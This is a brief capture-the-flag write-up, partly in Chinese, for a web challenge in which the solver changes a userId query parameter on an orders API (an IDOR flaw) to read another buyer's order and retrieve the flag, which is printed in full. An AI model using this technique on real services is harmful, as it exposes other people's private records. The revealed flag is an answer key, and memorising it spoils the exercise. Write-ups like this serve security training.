# The Exposed Orders

## 題目描述

Order history should be private, but the marketplace leaves a few loose threads. Can you follow one to something that is not yours?

## 解題思路

跟 `The Loose Ledger` 那題很像，那題的查詢節點是 `/api/orders/lookup?ref=<ref>`，而這題是 `/api/orders/`

看回應的結果可以發現他多了一個 `userId`，而且可以使用 `?userId=<id>` 來更改 (當然也可以透過 JWT 但比較麻煩就是了)

於是就隨便找了一個買家，運氣非常好，在 `/listing/macro-builder` 找到了 id 為 `k7m3n` 的 `Phantom_Hacker`，於是使用 `/api/orders?userId=k7m3n` 即可得到 flag

```json
{
  "orders": [
    {
      "id": "order-admin-001",
      "userId": "k7m3n",
      "listingId": "macro-builder",
      "listingName": "Macro Builder",
      "price": 199.99,
      "status": "completed",
      "notes": "bitflag{1d0r_1s_4_d4ng3r0us_g4m3}",
      "createdAt": "2026-06-21T09:30:05.259Z"
    }
  ],
  "userId": "k7m3n"
}
```

## Flag

```text
bitflag{1d0r_1s_4_d4ng3r0us_g4m3}
```
